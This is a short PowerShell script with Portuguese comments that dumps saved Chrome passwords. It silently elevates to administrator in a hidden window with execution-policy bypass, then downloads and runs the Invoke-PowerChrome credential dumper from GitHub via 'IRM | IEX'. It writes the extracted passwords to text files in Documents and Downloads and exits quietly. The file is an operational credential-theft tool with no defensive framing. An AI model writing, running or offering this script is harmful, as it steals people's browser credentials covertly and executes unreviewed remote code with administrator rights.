# ExtrairSenhas.ps1 - Salva em DOCUMENTS e DOWNLOADS (dois arquivos)

# Força a execução como administrador (necessário para Chrome v20)
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`"" -Verb RunAs -WindowStyle Hidden
    exit
}

# Define a pasta Documents
$pastaDocuments = [Environment]::GetFolderPath("MyDocuments")
if (-not (Test-Path $pastaDocuments)) {
    $pastaDocuments = Join-Path $env:USERPROFILE "Documents"
}

# Define a pasta Downloads
$pastaDownloads = [Environment]::GetFolderPath("UserDownloads")
if (-not (Test-Path $pastaDownloads)) {
    $pastaDownloads = Join-Path $env:USERPROFILE "Downloads"
    if (-not (Test-Path $pastaDownloads)) {
        $pastaDownloads = Join-Path $env:USERPROFILE "Baixados"
    }
}

# Nome do arquivo com data/hora
$datahora = Get-Date -Format "yyyyMMdd_HHmmss"
$arquivoDocuments = Join-Path $pastaDocuments "senhas_chrome_$datahora.txt"
$arquivoDownloads = Join-Path $pastaDownloads "senhas_chrome_$datahora.txt"

# Carrega o script do GitHub
$null = IRM 'https://raw.githubusercontent.com/The-Viper-One/Invoke-PowerChrome/refs/heads/main/Invoke-PowerChrome.ps1' | IEX

# Executa e redireciona a saída para AMBOS os arquivos
$output = Invoke-PowerChrome -Browser Chrome 2>&1
$output | Out-File -FilePath $arquivoDocuments -Encoding UTF8
$output | Out-File -FilePath $arquivoDownloads -Encoding UTF8

# Sai silenciosamente
exit
